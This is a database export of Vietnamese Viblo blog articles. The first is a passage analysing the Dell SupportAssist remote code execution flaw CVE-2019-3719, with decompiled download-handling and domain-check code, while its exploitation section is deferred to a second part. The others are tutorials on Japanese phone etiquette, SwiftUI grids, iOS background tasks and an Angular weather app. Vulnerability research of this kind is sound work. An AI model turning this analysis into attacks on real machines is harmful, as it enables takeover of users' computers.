(flag2)\n {\n     file.Location = file.Location.Replace("http://", "https://");\n }\n bool flag3 = file != null && !string.IsNullOrEmpty(file.Location) && !SecurityHelper.CheckDomain(file.Location);\n if (flag3)\n {\n     DSDLogger.Instance.Error(DownloadServiceLogic.Logger, "InvalidFileException being thrown in _HandleJson method");\n     throw new InvalidFileException();\n }\n}\nDownloadHandler.Instance.RegisterDownloadRequest(CreateIso, Bootable, Install, ManualInstall, list);\n```\n&nbsp;&nbsp;Đoạn mã trên lặp lại qua từng tệp và kiểm tra xem URL tệp chúng ta cung cấp bắt đầu bằng http: // hay không? (nếu có, thế bằng https: //) và kiểm tra xem URL có khớp với danh sách tải xuống của Dell? (không phải tất cả subdomain):<br>\n```\npublic static bool CheckDomain(string fileLocation)\n{\n\tList<string> list = new List<string>\n\t{\n\t\t"ftp.dell.com",\n\t\t"downloads.dell.com",\n\t\t"ausgesd4f1.aus.amer.dell.com"\n\t};\n\t\n\treturn list.Contains(new Uri(fileLocation.ToLower()).Host);\n} \n```\n&nbsp;&nbsp; Cuối cùng, nếu tất cả các kiểm tra này vượt qua, các tệp sẽ được gửi đến DownloadHandler.RegisterDoadRequest và *Support Assist* sẽ tải xuống và chạy các tệp với tư cách Quản trị viên.<br><br>         \n&nbsp;&nbsp; Vậy là thông qua đây ta có thể tiến hành khai thác.( **các bạn chờ phần 2 nhá** )\n    \n    \n# 3.  Cách khai thác\n(vui lòng đón đọc phần 2)\n# 4.  Tổng kết đánh giá và phương pháp phòng tránh\n\n* link tham khảo: https://d4stiny.github.io/Remote-Code-Execution-on-most-Dell-computers/	1. Tổng quan\nNếu anh em nào đó đang sử dụng máy tính DELL mà lâu lâu rồi chưa update thì hãy cẩn thận đấy... Sau bài viết này các bạn có thể trở thành những "nạn nhân" cho các anh em khác thử nghiệm đấy. <br>\n&nbsp;&nbsp;Cụ thể, một người nghiên cứu bảo mật 17 tuổi tên là Bill Demirkapi đã phát hiện ra lổ hổng bảo  mật nghiêm trọng này trên các thiết bị của Dell. Lổ hổng này cho phép tin tặc có...	{https://images.viblo.asia/6d393182-fe33-4a6d-8cb2-60d3b82a0aeb.png,https://images.viblo.asia/25602119-cc78-40f8-a289-ba5061ffe4cf.png,https://images.viblo.asia/cbade509-232f-465f-96ab-c11245e41e8c.png,https://i.imgur.com/3koDq6L.png,https://i.imgur.com/bEVfaii.png,https://images.viblo.asia/77e7008d-0eb6-48ae-b193-f9b29fc149d4.png}	1	[CVE-2019-3719] Phân tích và POC Lỗ hổng khai thác chiếm quyền điều khiển máy tính DELL từ xa. | remote code execution on most Dell computer (Phần 1)	{rce,dell,vuln,cve-2019-3719}	0	f	2022-12-18 15:33:37.843+00	2022-12-18 15:33:37.843+00
32029	Trong bussiness, bởi rất nhiều tình huống và các công việc khác nhau mà chúng ta có nhiều cơ hội tiếp xúc với khách hàng thông qua điện thoai. Đó sẽ là một cơ hội hay là một “điểm trừ”, còn tùy thuộc nhiều vào thói quen và sự ứng biến linh hoạt của người nói. Dù trong hoàn cảnh “không nhìn thấy mặt nhau”,  nhưng lại kết nối được với nhau qua câu từ, dụng pháp communicate, và việc các bạn có đang làm tốt những điều cơ bản trong bussiness manner này không thực sự rất quan trọng. \nXã hội hiện đại bằng sự phổ cập internet, nhiều bạn trẻ nói rằng “đến bây giờ tôi chỉ quen dùng mobile, chưa từng tiếp cận và sử dụng máy bàn”,và cùng với điều đó, các bạn đều chưa nắm được những manner đó. Điều đó có đặc biệt quan trọng hơn khi các bạn tiếp xúc,làm việc với ngôn ngữ tiếng Nhật, người trẻ đều có xu hướng giao tiếp qua chat, mạng xã hội, messeger...khiến cho họ cảm thấy bất an khi bước vào công việc. Vì vậy bài viết này mình xin được giới thiệu đến mọi người những đều cơ bản nhất, để không nhầm lẫn, và đạt được những bước đi cơ bản trong giao tiếp của mình. \n\n### 1. Trả lời nhanh chóng, sẵn sàng memo \n\nKhông để đối phương chờ là điều ưu tiên hàng đầu. Không cần nghĩ ngợi xem ai là người gọi đến, tu thế tích cực sẵn sàng đón nhận mọi cuộc điện thoại mới là quan trọng. Dù đang làm công việc gì, hãy ưu tiên cho những hồi chuông điện thoại nhé. Và không để lỡ bất cứ thông tin nào, bạn hay sẵn sàng sổ memo trên bàn mọi lúc.\n\n### 2. Hãy nói「お待たせいたしました。」khi đổ quá 3 hồi chuông\n\nNgười Nhật có câu “三鈴は職場の恥”, 3 hồi chuông là sự mất mặt nơi công sở, nghĩa là trong bussiness, điều quan trọng đầu tiên là nhanh chóng bắt điện thoại. Có nhiều công ty đặt ra quy tắc tối thiểu phải bắt máy ngay từ hồi chuông đầu tiên, nhưng dù là công ty nào thì cơ bản đừng để nó vượt qua con số 2 bạn nhé. \nVà nếu lỡ như để chạm đến cón số 3, đừng quên đính kèm câu quen thuộc 3「お待たせいたしました。」như một lời xin lỗi đến khách hàng, đối tác.  Thực tế, về mặt cảm quan thời gian, 2 hay 3 cũng không có gì khác nhau, nhưng trong bussiness manner của toàn xã hội nhật, nhận thức về chúng lại hoàn toàn khác nhau. Do vậy để có thể tạo ấn tượng thật tốt, không bị coi là vô trách nhiệm, lơ là công việc, thì hãy đắc biệt chú ý đến điều này nhé. \n\n### 3. 「もしもし」: NG\n\nKhi có điện thoại đến, thông thường câu đầu tiên sẽ là 「お電話ありがとうございます。株式会社●●でございます。」hoặc「はい、株式会社▲▲でございます。」\nCác bạn sử dụng câu nào cũng được, tuy nhiên nếu thồng nhất 1 cách nói trong toàn công ty sẽ mang đến sự chuyên nghiệp, tự tin hơn rất nhiều. \nCó nơi dùng ngay danh xưng một loạt ngay từ lời chào đầu tiên như: 「株式会社●●　□□部　山田が受けました。」, nhưng nếu là cuộc điện thoại thẳng đến công ty thì có vẻ điều này cũng chưa cần thiết (ngoại trừ các trường hợp đã thành quy tắc ở một số công ty) \nẤn tượng đầu tiên có thể được xác lập ngay từ những điều đầu tiên này, nên các bạn hãy chuẩn bị cho mình cả tông, ngữ khí sao cho phù hợp, khiến khách hàng, đối tác dễ nghe, dễ nắm bắt thông tin và có thiện cảm hơn với  chình bản thân và công ty mình đang làm việc nhé. \n\n### 4. Tươi cười, chuẩn bị tư thế, tác phong ngay cả khi nói chuyện bằng điện thoại. \n\nNói chuyện qua điện thoại thì chẳng ai nhìn thấy, chống cằm, khuôn mặt uể oải, vắt chân….thì cũng chẳng ai biết. Trường hợp này không phải hiểm, nhất là ở Việt Nam mình, thế nhưng người Nhật thì không vậy, dù qua điện thoại, đối tác tinh ý có thể nhận ra đối phương đang trả lời điện thoại bằng giọng điệu, tông âm như thế nào. Thái độ là thứ có thể truyền đạt qua giọng nói, vì vậy dù là trước mặt hay điện thoại, bạn hãy thể hiện một tư thế tích cực nhất, khiến cho đối phương cảm thấy mình được chào đón, tôn trọng như đang đối thoại trực tiếp. \nThế nhưng ngược lại, nếu không phải là mình nhận điện thoại mà là người khác, hãy giữ yên lặng, việc cười cợt, to tiếng sẽ vô tình lọt vào ống nghe, khiến khách hàng có ấn tượng「不真面目な会社」, vô hình chung đã làm mất điểm trầm trọng rồi. \n \n### 5. Dù không phải đối tác quen thuộc cũng hãy nói「いつもお世話になっております。」\n\nĐã quá quen thuộc với câu nói này, khi mà câu đầu tiên xưng danh, thì phía bên kia cũng vậy. Trở thành thông lệ, từ lần sau đó 2 bên đều sẽ nói「いつもお世話になっております。」\nTuy thế, không chỉ giới hạn cho người quen, ngay cả khác hàng lần đầu gọi đến nó cũng là một quy tắc giao tiếp không thể thiếu của người Nhật. \n\n### 6. Xác nhận khi đối phương không xưng tên. \n\nỞ công ty, có vô số những cuộc điện thoại từ nhiều người bằng nhiều mục đích khác nhau gọi đến. Và không hẳn lần nào cũng là “một cuộc điện thoại tốt”. Dù là cuộc điện thoại với mục đích nào hãy chắc chắc bạn có thể xác nhận được tên, công ty người gọi đến bằng 「失礼ですが、お名前をうかがってもよろしいでしょうか。」hoặc「恐縮ですが、お名前をお聞かせいただけますか。」\nNhân tiện thì có thể bạn nghe đến hoặc bắt gặp cụm「お名前頂戴できますか。」thì hãy tránh nhé, vì nó bị nhầm mất rồi, vốn 頂戴する là khiêm nhường ngữ của もらう nên dùng sẽ không hợp lý. \n\n*Bài viết được tham khảo và dịch từ nguồn: https://liginc.co.jp/life/useful-info/105172\n*	Trong bussiness, bởi rất nhiều tình huống và các công việc khác nhau mà chúng ta có nhiều cơ hội tiếp xúc với khách hàng thông qua điện thoai. Đó sẽ là một cơ hội hay là một “điểm trừ”, còn tùy thuộc nhiều vào thói quen và sự ứng biến linh hoạt của người nói. Dù trong hoàn cảnh “không nhìn thấy mặt nhau”,  nhưng lại kết nối được với nhau qua câu từ, dụng pháp communicate, và việc các bạn có đan...	{}	1	PHẦN I: CÁC QUY TẮC ỨNG XỬ CẦN BIẾT TRONG GIAO TIẾP ĐIỆN THOẠI BẰNG TIẾNG NHẬT	{html,business,brse}	0	f	2022-12-18 15:33:37.856+00	2022-12-18 15:33:37.856+00
32014	Như các bạn đã biết SwiftUI đang là xu hướng mới trong lập trình iOS, nó là một công cụ giúp cho việc xây dựng giao diện người dùng trở nên dễ dàng và trực quan hơn.\nCho dù chưa được Apple chính thức ra mắt, nhưng SwiftUI đã trở thành mối quan tâm lớn nhất của cộng đồng các nhà phát triển iOS trong thời gian qua.\nTrong bài viết này, chúng ta cùng nhau tìm hiểu về GridStack, một thành phần mới của SwiftUI, một dạng layout views lưới linh hoạt, tiện lợi.\n\n## GridStack - layout lưới trong vài dòng code\n\nThông thường, để tạo ra 1 giao diện với layout có dạng lưới với UIKit, chúng ta sẽ có khá nhiều việc phải làm với UICollectionView, từ việc xử lý datasource cho đến tính toán kích thước các item trong 1 đống các function của UICollectionViewDelegateFlowLayout.\n\nNhưng với GridStack, chúng ta có thể dễ dàng tạo ra giao diện lưới với vài dòng code. Những việc cần làm chỉ đơn giản là truyền vào giá trị chiều rộng nhỏ nhất mà các grid cell cần có và khoảng cách giữa chúng và chúng sẽ tự điều chỉnh kích thước dựa trên kích thước cho phép của các màn hình khác nhau.\n\nCode sẽ trông như sau:\n\n```\nGridStack(minCellWidth: 300, spacing: 2, numItems: 15) { index, cellWidth in\n    Text("\\(index)")\n        .color(.white)\n        .frame(width: cellWidth, height: cellWidth * 0.66)\n        .background(Color.blue)\n}\n```\n\nChúng ta sẽ nhận được kết quả như bên dưới:\n\n![](https://images.viblo.asia/eec0fe65-70de-4edb-b2a7-cb8a7701c3f6.png)\n\nChúng cũng sẽ tự điều chỉnh số lượng item trên 1 hàng để phù hợp với kích thước mong muốn, khi device được xoay:\n\n![](https://images.viblo.asia/4e772b86-410c-418b-947c-65e10e3e0c42.gif)\n\n## Tổng quan về sử dụng\n\nHãy nghĩ về lưới theo chiều rộng tối thiểu bạn muốn các ô của bạn là bao nhiêu. Bằng cách đó, nó dễ dàng điều chỉnh cho bất kỳ không gian có sẵn. Kích thước khác duy nhất bạn cần cung cấp là khoảng cách giữa các ô.\n\nĐể thực sự tạo lưới, chúng ta cần biết số lượng các items. Sau đó, trình xây dựng chế độ xem nội dung sẽ được gọi với mỗi chỉ mục và cellWidth mà sau đó bạn có thể chuyển đến khung của bất cứ thứ gì bạn muốn hiển thị bên trong.\n\n## Kích thước của views bên trong các cells\n\nLưới sẽ gói mỗi item mà bạn cung cấp trong 1 view được định nghĩa bởi cellWidth với chiều ngang của chúng. Không có bất cứ giá trị nào để định nghĩa cho chiều cao của cell. Điều đó có nghĩa bạn có thể điều chỉnh kích thước nội dung của cell linh hoạt nhất có thể. Dưới đây là một vài ví dụ mà bạn có thể thực hiện\n\n* Chiều cao được định nghĩa bởi nội dung\n\n```\nGridStack(...) { index, cellWidth in\n    Text("\\(index)")\n        // Không truyền bất cứ chiều cao nào vào frame, mà chúng sẽ tự xác định dựa vào nội dung\n        .frame(width: cellWidth)\n}\n```\n\n* Items hình vuông\n\n```\nGridStack(...) { index, cellWidth in\n    Text("\\(index)")\n        // Truyền vào cellWidth cho width và height để tạo ra lưới với các hình vuông\n        .frame(width: cellWidth, height: cellWidth)\n}\n```\n\n* Kích thước dựa trên tỉ lệ khung hình\n\n```\nGridStack(...) { index, cellWidth in\n    Text("\\(index)")\n        // Truyền vào cellWidth cho chiều rộng và chiều cao sẽ xác theo tỉ lệ so với chiều rộng\n        .frame(width: cellWidth, height: cellWidth * 0.75)\n}\n```\n\n## Khởi tạo\n\nMột khởi tạo đầy đủ của GridStack sẽ có dạng như sau:\n\n```\nGridStack(\n    minCellWidth: Length,\n    spacing: Length,\n    numItems: Int,\n    alignment: HorizontalAlignment = .leading,\n    content: (index: Int, cellWidth: CGFloat) -> Void\n)\n```\n\n## Kết luận\n\nTrên đây chúng ta đã cùng tìm hiểu một thành phần mới của SwiftUI - GridStack - một công cụ để xây dụng giao diện người dùng dạng lưới một cách đơn giản và trực quan.\nHy vọng bài viết trên sẽ hữu ích với các bạn trong quá trình tìm hiểu các tính năng mới mà 1 công cụ mạnh mẽ SwiftUI mang lại.\n\nBài viết được dịch từ: https://github.com/pietropizzi/GridStack	Như các bạn đã biết SwiftUI đang là xu hướng mới trong lập trình iOS, nó là một công cụ giúp cho việc xây dựng giao diện người dùng trở nên dễ dàng và trực quan hơn.\nCho dù chưa được Apple chính thức ra mắt, nhưng SwiftUI đã trở thành mối quan tâm lớn nhất của cộng đồng các nhà phát triển iOS trong thời gian qua.\nTrong bài viết này, chúng ta cùng nhau tìm hiểu về GridStack, một thành phần mới c...	{https://images.viblo.asia/eec0fe65-70de-4edb-b2a7-cb8a7701c3f6.png,https://images.viblo.asia/4e772b86-410c-418b-947c-65e10e3e0c42.gif}	1	(SwiftUI) GridStack - layout lưới trong vài dòng code	{swiftui,swift,ios}	0	f	2022-12-18 15:33:37.885+00	2022-12-18 15:33:37.885+00
32011	Trong bài viết này, tôi sẽ thảo luận về  BackgroundTasks framework được giới thiệu trong **WWDC** vừa rồi.\n\n**Apple** đã phát hành một framework tuyệt vời khác trong năm này, và lần này là **BackgroundTasks** framework. Chúng ta có thể sử dụng nó để lập lịch và kiểm soát các điều kiện thực thi của các tác vụ ở background. **BackgroundTasks** framework cho phép bạn lập kế hoạch và chạy công việc ở background theo các tiêu chí bắt buộc  như pin đang sạc, tính khả dụng của kết nối, vv... **BackgroundTasks** framework có nhiều kiểu tác vụ khác nhau. Giờ chúng ta cùng xem xét nhé.\n\n# Tác vụ làm mới ứng dụng\n\n**BGAppRefreshTask** là một kiểu tác vụ đặc biệt của  **Background Task**  mà bạn có thể sử dụng để cập nhật dữ liệu ứng dụng. Một điều làm cho tác vụ này rất đặc biệt đó là hành vi người dùng. iOS tìm hiểu tần suất và thời gian người dùng đang chạy ứng dụng của bạn và cố gắng chạy **BGAppRefreshTask** ở thời điểm mà người dùng không sử dụng app. \n\nHãy triển khai một *background app* làm mới cho sample app. Trước hết, bạn cần phải thêm *background modes capability* trong project settings. Tiếp theo, bạn cần thêm **“Background fetch”** checkbox, cái được yêu cầu trong việc làm mới ứng dùng background. Cuối cùng, bạn cần thêm **“Permitted background task scheduler identifiers”** key vào Info.plist. Key này sẽ lưu trữ mảng unique identifiers cho mọi **background task** trong ứng dụng. Cuối cùng, bạn đã có đầy đủ những điều kiện để bắt đầu xử lý logic của background refresh.\n\n\n```\nimport UIKit\nimport BackgroundTasks\n\n@UIApplicationMain\nclass AppDelegate: UIResponder, UIApplicationDelegate {\n\n    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {\n        BGTaskScheduler.shared.register(\n            forTaskWithIdentifier: "pl.snowdog.example.refresh",\n            using: DispatchQueue.global()\n        ) { task in\n            self.handleAppRefresh(task)\n        }\n        return true\n    }\n\n    private func handleAppRefresh(_ task: BGTask) {\n        let queue = OperationQueue()\n        queue.maxConcurrentOperationCount = 1\n        let appRefreshOperation = AppRefreshOperation()\n        queue.addOperation(appRefreshOperation)\n\n        task.expirationHandler = {\n            queue.cancelAllOperations()\n        }\n\n        let lastOperation = queue.operations.last\n        lastOperation?.completionBlock = {\n            task.setTaskCompleted(success: !(lastOperation?.isCancelled ?? false))\n        }\n\n        scheduleAppRefresh()\n    }\n}\n```\n\n\nChúng ta bắt đầu bằng việc đăng ký t*ask identifier*  và *associated closure*. Closure này sẽ chạy trên mọi việc thực thi tác vụ. Trong **handleAppRefresh** function, chúng ta chạy xử lý background.\n\nCó hai điểm chính ở đây:\n\n1.  Đảm bảo bạn gọi **setTaskCompleted** method ngay khi công việc kết thúc.\n\n2.  Đặt expiration handler trên task object bơi vì hệ thống cho bạn khoảng thời gian giới hạn để hoàn thành công việc và nếu vượt quá, bạn sẽ phải giải phóng tài nguyên.\n\nHãy nhớ rằng, bạn chỉ có thể lập lịch một lần cho một công việc, bạn phải lập lịch cho nó mỗi lần nếu muốn thực hiện định kỳ.\n\n\n```\n    func applicationDidEnterBackground(_ application: UIApplication) {\n        scheduleAppRefresh()\n    }\n\n    private func scheduleAppRefresh() {\n        do {\n            let request = BGAppRefreshTaskRequest(identifier: "pl.snowdog.example.refresh")\n            request.earliestBeginDate = Date(timeIntervalSinceNow: 3600)\n            try BGTaskScheduler.shared.submit(request)\n        } catch {\n            print(error)\n        }\n    }\n```\n\n\n# Tác vụ xử lý background\n\nMột loại background tasks khác là **Processing task**. Bạn có thể sử dụng nó để huấn luyện một ML Model trên thiết bị hoặc dọn dẹp cơ sở dữ liệu. Trước khi bắt đầu, cần bật “Background processing” checkbox trong Background Modes capability. Hãy thêm một identifier khác cho kiểu tác vụ này vào Info.plist.\n\n\n```\nimport UIKit\nimport BackgroundTasks\n\n@UIApplicationMain\nclass AppDelegate: UIResponder, UIApplicationDelegate {\n\n    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {\n        \n        BGTaskScheduler.shared.register(\n            forTaskWithIdentifier: "pl.snowdog.example.train",\n            using: DispatchQueue.global()\n        ) { task in\n            self.handleMLTrain(task)\n        }\n        return true\n    }\n\n    private func scheduleMLTrain() {\n        do {\n            let request = BGProcessingTaskRequest(identifier: "pl.snowdog.example.train")\n            request.requiresExternalPower = true\n            request.requiresNetworkConnectivity = true\n            try BGTaskScheduler.shared.submit(request)\n        } catch {\n            print(error)\n        }\n    }\n}\n```\n\n\nLập lịch cho processing task giống với app refresh task. Hãy xem **scheduleMLTrain** function. Hãy đặt requiresExternalPower và  requiresNetworkConnectivity properties  bằng true. Bằng cách này, bạn đã chỉ ra rằng, công việc chúng ta cần kết nối mạng và sạc pin. Tôi khuyến khích bạn thực hiện các công việc tính toán nặng nề trong khi thiết bị đang được sạc để hao pin và làm xấu trải nghiệm người dùng.\n\n\n# Debugging\n\nCách duy nhất để gỡ lỗi background tasks là giữ thiết bị của bạn kết nối với Xcode debugger, nhưng chúng ta không biết khi nào iOS sẽ chạy các tác vụ của mình vì nó thực hiện các logic ẩn. Rất may, Apple cung cấp hai phương thức trong debugger để bắt đầu và hết hạn các background tasks. Hãy ghi nhớ rằng, bạn có thể dùng nó trong quá trình phát triển, và không bao gồm trong bản release. \n\nĐể bắt đầu các background tasks, tạm dừng ứng dụng và chạy trong Debugger đoạn code này:\n\n```\ne -l objc — (void)[[BGTaskScheduler sharedScheduler] _simulateLaunchForTaskWithIdentifier:@”TASK_IDENTIFIER”]\n```\n\nĐể buộc ngưng sử dụng:\n\n```\ne -l objc — (void)[[BGTaskScheduler sharedScheduler] _simulateExpirationForTaskWithIdentifier:@”TASK_IDENTIFIER”]\n```\n\n\nNhớ thay thế **TASK_IDENTIFIER** bằng identifier thực tế.\n\n# Kết luận\n\n**BackgroundTasks** framework  là một cách tuyệt vời để lập lịch cho các tác vụ nặng nề của bạn đêm lại trải nghiệm tốt nhất bằng việc sử dụng các điều kiện môi trường. Apple đã cung cấp hàng loạt frameworks mới trong năm nay, tôi sẽ cố gắng cập nhật nhiều chủ đề mới ở các bài viết sau.\n\nCảm ơn!\n\n[Refer](https://medium.com/snowdog-labs/managing-background-tasks-with-new-task-scheduler-in-ios-13-aaabdac0d95b)	Trong bài viết này, tôi sẽ thảo luận về  BackgroundTasks framework được giới thiệu trong WWDC vừa rồi.\n\nApple đã phát hành một framework tuyệt vời khác trong năm này, và lần này là BackgroundTasks framework. Chúng ta có thể sử dụng nó để lập lịch và kiểm soát các điều kiện thực thi của các tác vụ ở background. BackgroundTasks framework cho phép bạn lập kế hoạch và chạy công việc ở background th...	{}	1	Quản lý background tasks với Task Scheduler trên iOS 13	{swift-5}	0	f	2022-12-18 15:33:37.896+00	2022-12-18 15:33:37.896+00
31735	Lần trước mình đã có một bài hướng dẫn các bạn [biến một file pts thành 1 giao diện web](https://viblo.asia/p/ho-bien-mot-file-psd-thanh-giao-dien-web-voi-html-css-RnB5pB96ZPG), hôm nay chúng ta sẽ bắt tay vào làm một trang web dự báo thời tiết mà hoàn toàn có thể đem ra sử dụng thật luôn, từ các bước thiết kế cho đến lập trình sử dụng Adobe XD, Angular 7 và Firebase.\n## Bước 1: Thiết kế\nBạn có thể down bản thiết kế tại [đây](https://drive.google.com/file/d/17IoWndfi4WrGCPsg-MMW1lYtoy14EjDt/view) để xem các layer xếp chồng lên nhau thế nào để tạo ra được bản thiết kế cuối cùng.\n### A. Thương hiệu\n![](https://images.viblo.asia/9118f690-53a0-4dfe-a224-6cff5021fbb6.png)\n\nThương hiệu sẽ thể hiện được giá trị cốt lõi của nó thông qua bản thiết kế, và ở đây thể hiện sự tối giản, gọn gàng và dễ sử dụng.\n* **Màu sắc**\n\n    2 màu sắc cơ bản đã bão hòa đem lại sự tươi mới cho giao diện\n* **Kiểu chữ**\n\n    Chỉ sử dụng đúng font 'Sans Serif' nên chúng ta không phải tải bất cứ font nào khác, giúp tăng hiệu suất\n* **Logo**\n\n![](https://images.viblo.asia/4719b666-2160-4e86-95d0-96855188da10.png)\n\nViệc thiết kế logo nói dễ không dễ, nói khó cũng không hẳn, căn bản là phải phù hợp với mục đích của thương hiệu. Như logo của Nike, chỉ là một dấu chữ check, mất có 35$, trông khi logo của pepsi, cũng chỉ là 3 màu cơ bản xoay qua lại một chút, tốn 1.000.000$ :joy:  Còn đây là logo chúng ta sẽ dùng, chỉ là một chữ M đơn giản, sử dụng 2 hình tam giác giao nhau, vs 2 màu là 2 màu cơ bản của trang web, hiệu quả và chỉ tốn có 0 đồng.\n### B. UI/UX\nỨng dụng chủ yếu sử dụng các thẻ có đổ bóng giống như những mảnh giấy trôi nổi. Chỉ những thông tin quan trọng mới được hiển thị ở phía trước để tránh khiến giao diện lộn xộn và sử dụng các hành ảnh động để tăng điểm UX.\n* **Light mode (Mặc định)**\n\n![](https://images.viblo.asia/3abc2200-8703-4553-b3f2-e662dd1a2138.png)\n\n   **Dark mode**\n\n![](https://images.viblo.asia/147ced94-e1b0-4078-b3bb-a69bd8ed7c02.png)\n* **Icon**\n\n    Người dùng sẽ phải được thông báo về tình hình thời tiết trong nháy mắt, vì thế nên chúng ta sẽ sử dụng bộ icon sau cho cả trang web\n\n![](https://images.viblo.asia/0866ea38-9896-4db3-bfd4-7fbddd4460d8.png)\n\n* **Tranh minh họa**\n\nCó một cách để người dùng có thể dễ dàng đoán ra địa điểm mà lại lấp đầy khoảng trống một cách cực kì trực quan, đấy là thêm một bức tranh minh họa địa điểm, họ sẽ chẳng cần phải đọc chữ, mà hình ảnh thì lúc nào cũng để lại ấn tượng hơn. Cùng nghía qua 1 số hình minh họa nhé!\n1. Tunisia\n\n![](https://images.viblo.asia/b262d9ac-3169-476a-b67b-d0db899de5ab.png)\n2. Qatar\n\n![](https://images.viblo.asia/a7ab1580-6da6-4faf-b9d0-02421da703a1.png)\n3. Nhật bản\n\n![](https://images.viblo.asia/e1f2962d-715b-4437-b336-6f853aac5ace.png)\n4. Pháp\n\n![](https://images.viblo.asia/857d118d-d8ad-4de7-a29a-fccbd13b0ffc.png)\n\n## Bước 2: Lập trình\nĐã gọi là từ A tới Z thì phải bắt đầu từ người chưa biết gì, nên chúng ta sẽ bắt đầu từ việc install nodejs và angular CLI nhé. Ai biết rồi thì có thể bỏ qua đoạn này.\n\nInstall nodejs từ [đây](https://nodejs.org/en/), sau đó mở console, install Angular CLI và typescript  bằng câu lệnh sau\n```\nnpm i -g typescript \nnpm i -g @angular/cli\n```\n![](https://images.viblo.asia/cc052b8c-01ca-4220-ac2a-ef7f328704af.gif)\nSau đấy chạy dòng lệnh sau để generate app sử dụng Angular CLI và đừng quên thêm `--routing` để về sau phân trang và thêm các đường dẫn.\n```\nng new Minimus --routing\n```\n![](https://images.viblo.asia/c09e9760-946c-4109-9cf9-829d5f0cd4cf.gif)\n\nSau khi đã generate và install xong các thứ cần thiết, chúng ta sẽ khởi động server bằng câu lệnh (thêm `-o` để tự động mở ứng dụng trên tab mới)\n```\nng serve -o \n```\n![](https://images.viblo.asia/de81e088-3757-46a0-85eb-0e8296d57f8c.gif)\n###  A. Template và style\nTrước khi đọc tiếp, hãy đảm bảo bạn sẽ tận dụng tối đa bài hướng dẫn này, bằng cách ngưng việc copy + paste, hãy đọc code, mở phần mềm code và trình duyệt cạnh nhau, gõ lại theo cách của bạn, đó là cách duy nhất để bạn có thể hiểu từ đầu đến cuối.\n\nRồi, giờ thì quay trở lại project, nơi chúng ta đã hoàn thành các bước setup cơ bản, tiếp theo sẽ là viết HTML và CSS. Hãy mở phần mềm code yêu thích của bạn và bắt đầu nào!\n* **App Component**\n\nChúng ta sẽ sử dụng root component `app.component` cho phần navbar component, sẽ làm cho nó ẩn hiện tùy vào việc người dùng có login hay không (sẽ nói đến trong part 2). Có một số thư viện Angular có thể hỗ trợ, nhưng để đảm bảo nó nhẹ nhất có thể, trong bài viết này sẽ không sử dụng đến. \n\nĐầu tiên mở file `app.component.html`, xóa toàn bộ đoạn HTML mặc định đi, và thêm đoạn HTML này vào:\n```\n<!-- Slide Menu-->\n<aside class="side-menu__container" [ngClass]="{'side-menu__container-active': showMenu}" (click)="toggleMenu()">\n<nav class="slide-menu" [ngClass]="{'slide-menu-active': showMenu}" (click)="$event.stopImmediatePropagation();">\n    <section class="menu-header">\n        <span class="greeting__text">Welcome Back</span>\n        <div class="profile-image__container">\n            <img src="https://avatars3.githubusercontent.com/u/5658460?s=460&v=4" alt="profile-image"\n                 class="profile__image">\n        </div>\n        <div class="account-details">\n            <span class="name__text">Hamed Baatour</span>\n            <span class="email__text">hamedbaatour@gmail.com</span>\n        </div>\n    </section>\n    <section class="menu-body">\n\n    </section>\n    <section class="menu-footer">\n\n    </section>\n</nav>\n</aside>\n\n<div class="root__container" >\n    <header [ngClass]="{'main__header-dark': darkModeActive}" class="main__header">\n\n        <div class="left__section">\n          <svg (click)="toggleMenu()" class="hamburger__icon" id="Menu_Burger_Icon">\n              <!-- hamburger icon svg code goes here-->  \n          </svg>\n\n            <svg class="logo__icon">\n              <!-- logo svg code goes here-->\n            </svg>\n\n        </div>\n\n        <h3 class="date__text">Today</h3>\n\n\n        <div class="mode-toggle__container">\n            <span class="mode-toggle__text">Light</span>\n\n            <label class="toggle-button__container">\n                <input (click)="modeToggleSwitch()" type="checkbox" class="mode-toggle__input" />\n                  <span [ngClass]="{'mode-toggle__bg-checked': darkModeActive}" class="mode-toggle__bg"></span>\n                  <span [ngClass]="{'mode-toggle__circle-checked': darkModeActive}" class="mode-toggle__circle"></span>\n            </label>\n\n\n            <span class="mode-toggle__text">Dark</span>\n        </div>\n\n    </header>\n\n    <!-- Main Content -->\n\n    <!--<router-outlet></router-outlet>-->\n    <main class="main__container">\n        <div class="main-container__bg" [ngClass]="{'main-container__bg-dark': darkModeActive}"></div>\n        <router-outlet></router-outlet>\n    </main>\n\n    <!-- Footer -->\n\n    <footer class="main__footer">\n        <small class="copyright__text">Copyright © 2018 Minimus</small>\n    </footer>\n</div>\n```\nThêm hàm này vào file `app.component.ts` để đóng mở sidenav\n```\ntoggleMenu() {\n    this.showMenu = !this.showMenu;\n }\n ```\n\n**SVG icon**\n\nSVG icon và logo bạn có thể lấy ở đây (copy + paste)\n* [hamburger icon](https://gist.githubusercontent.com/hamedbaatour/9df5e3df4281fcb2ba336025897baace/raw/330466c7c15015069c1d6e7649d5fe2c04c8af15/Minimus%2520-%2520hamburger-icon.svg)\n* [logo](https://gist.githubusercontent.com/hamedbaatour/c5f19c873ee2cd98678707948d7f1112/raw/381ab91e4c903800953217eed3e966e25eac3f7f/Minimus%2520-%2520logo.svg)\n* [icon thời tiết](https://gist.githubusercontent.com/hamedbaatour/5ec33da214c26529c6a0479a9579a00a/raw/a9f7500364c620f1c4da97b467c102b601939150/Minimus%2520-%2520weather-conditions-icons.svg)\n\n**Thêm style cho root component**\n\nGiờ là thời gian dành cho css, hãy xem nhanh đoạn css bên dưới và xem kết quả đạt được, sau đó tự viết css của bạn, vì mỗi người 1 quan niệm về cái đẹp =))\n```\n.root__container {\n  width: 100vw;\n  height: 100vh;\n  display: grid;\n  grid-template-columns: auto;\n  grid-template-rows: 0.5fr auto;\n  position: relative;\n}\n\n/*\n================\n    Header\n================\n*/\n\n/*\n    Slide Menu\n= = = = = = = = =\n*/\n.side-menu__container {\n  position: fixed;\n  left: 0;\n  top: 0;\n  width: 100%;\n  height: 100%;\n  overflow: hidden;\n  pointer-events: none;\n  z-index: 25;\n}\n\n.side-menu__container-active {\n  pointer-events: auto;\n}\n\n.side-menu__container::before {\n  content: '';\n  cursor: pointer;\n  position: absolute;\n  display: block;\n  top: 0;\n  left: 0;\n  height: 100%;\n  width: 100%;\n  background-color: #0c1066;\n  opacity: 0;\n  transition: opacity 300ms linear;\n  will-change: opacity;\n}\n\n.side-menu__container-active::before {\n  opacity: 0.3;\n}\n\n.slide-menu {\n  box-sizing: border-box;\n  transform: 